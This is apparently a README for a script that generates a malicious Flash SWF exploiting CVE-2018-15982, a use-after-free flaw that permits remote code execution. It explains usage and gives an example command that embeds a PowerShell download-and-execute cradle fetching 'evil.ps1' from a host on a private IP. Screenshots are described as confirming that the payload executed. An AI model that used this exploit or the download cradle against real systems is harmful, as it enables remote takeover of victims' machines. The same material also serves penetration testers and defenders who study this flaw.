# Adobe Flash CVE-2018-15982

The script dynamically creates a swf payload for CVE-2018-15982, which is based off of the PoC payload from https://github.com/smgorelik/Windows-RCE-exploits.

The vulnerability is a use-after-free flaw enabling arbitrary code-execution in Flash.  More information can be found in the links below.

* https://threatpost.com/adobe-patches-zero-day-vulnerability-in-flash-player/139629/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-15982


Usage:

```python create_swf.py <command> <output file name>```

Example Usage:

```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.0.32/evil.ps1')" test.swf```
  


## Example


Command to download a file:

![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/cmd.png)


Executing malicious swf:

![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/exec.png)

Confirming successful execution:

![alt text](https://github.com/kphongagsorn/adobe-flash/blob/master/images/exec-confirm.png)
